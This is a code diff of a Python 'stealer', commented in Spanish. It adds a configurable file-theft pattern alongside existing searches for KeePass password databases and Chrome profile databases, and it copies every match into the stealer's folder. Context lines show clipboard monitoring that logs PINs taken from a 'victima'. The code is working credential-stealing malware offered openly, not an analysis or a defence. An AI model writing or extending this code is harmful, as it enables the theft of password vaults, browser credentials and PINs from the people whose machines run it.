@@ -31,26 +31,36 @@ def buscar_bases():
     if sistema_operativo == "Windows":
         mi_patron_keepass = settings.patron_keepass_windows
         mi_patron_chrome = settings.patron_chrome_windows
+        mi_patron_robo_archivo = settings.patron_robo_archivo_windows
     else:
         mi_patron_keepass = settings.patron_keepass_linux
         mi_patron_chrome = settings.patron_chrome_linux
+        mi_patron_robo_archivo = settings.patron_robo_archivo_linux
     bases_keepass = glob.glob(mi_patron_keepass, recursive=True)
     bases_chrome = glob.glob(mi_patron_chrome, recursive=True)
+    bases_archivo = glob.glob(mi_patron_robo_archivo , recursive = True)
     #2 => Registrar cada base de datos en el log
     for base in bases_keepass:
         loguear_hallazgo(base, "Base Keepass")
-        #3 => Copiar las bases de datos a la carpeta del stealer
+    #3 => Copiar las bases de datos a la carpeta del stealer
+        shutil.copy2(base, "./")
+    #2 => Registrar cada base de datos en el log
+    for base in bases_archivo:
+        loguear_hallazgo(base, "Robo Archivo")
+    #3 => Copiar el/los archivos a la carpeta del stealer
         shutil.copy2(base, "./")
     #4 => Registrar datos de Chrome en el log
     for base in bases_chrome:
         loguear_hallazgo(base, "Base Chrome")
-        #5 => Copiar las bases de datos a la carpeta del stealer
+    #5 => Copiar las bases de datos a la carpeta del stealer
         shutil.copy2(base, "./")
     #6 => Si se han encontrado bases de datos, avisar
     if len(bases_keepass) > 0:
         print("🚨 Encontrada Base de datos Keepass. Copiando... 😈")
     if len(bases_chrome) > 0:
         print("🚨 Encontrada Base de datos Chrome. Copiando... 😈")
+    if len(bases_archivo) > 0:
+        print("🚨 Encontrado Archivo. Copiando... 😈")
 
 #Monitorear portapapeles
 def monitorear():
@@ -109,7 +119,7 @@ def monitorear():
         if mi_patron_pin.match(victima_portapapeles):
             print("🚨 Encontrado PIN. Copiando... 😈")
             loguear_hallazgo(victima_portapapeles, "PIN")
-        
+
         #Esperar 5 segundos
         print("😴 Durmiendo...")
         time.sleep(5)
